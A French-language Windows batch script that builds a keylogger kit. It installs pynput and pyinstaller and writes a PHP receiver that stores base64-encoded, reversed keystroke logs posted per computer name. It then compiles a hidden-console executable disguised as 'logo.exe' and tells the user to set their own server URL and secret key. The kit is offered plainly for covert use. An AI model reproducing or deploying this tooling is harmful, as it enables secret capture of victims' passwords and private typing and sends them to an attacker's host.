@echo off
chcp 65001 >nul
echo === CRÉATION DE logo.exe ===
echo.

REM 1. Installe tout
pip install pynput requests pyinstaller

REM 2. Crée les fichiers PHP
echo Création des fichiers pour ton host...
python -c "
php_upload = '''<?php
// upload.php
\$secret_key = '3ust1s';
if (\$_POST['key'] !== \$secret_key) die('Access denied');
if (!file_exists('logs')) mkdir('logs', 0755, true);
\$data = date('Y-m-d H:i:s') . ' | ' . \$_POST['computer'] . '\\n';
\$data .= base64_decode(strrev(\$_POST['logs'])) . '\\n---\\n';
file_put_contents('logs/' . \$_POST['filename'], \$data, FILE_APPEND);
echo 'OK';
?>'''
with open('upload.php', 'w') as f: f.write(php_upload)
print('✅ upload.php créé')
"

REM 3. Modifie le script Python avec TES infos
echo.
echo MODIFIE dans logo.py :
echo 1. HOST_URL = 'https://ton-site/image/'
echo 2. SECRET_KEY = 'TON_SECRET'
echo.
pause

REM 4. Compile
echo Compilation...
pyinstaller --onefile --noconsole --name "logo" logo.py

echo.
echo ✅ TERMINÉ !
echo Fichiers créés :
echo - logo.exe (dans dist/)
echo - upload.php (à mettre sur ton host)
echo.
echo Sur ton host :
echo 1. Crée dossier /image/
echo 2. Mets upload.php dedans
echo 3. Crée dossier /image/logs/ (CHMOD 755)
echo.
pause
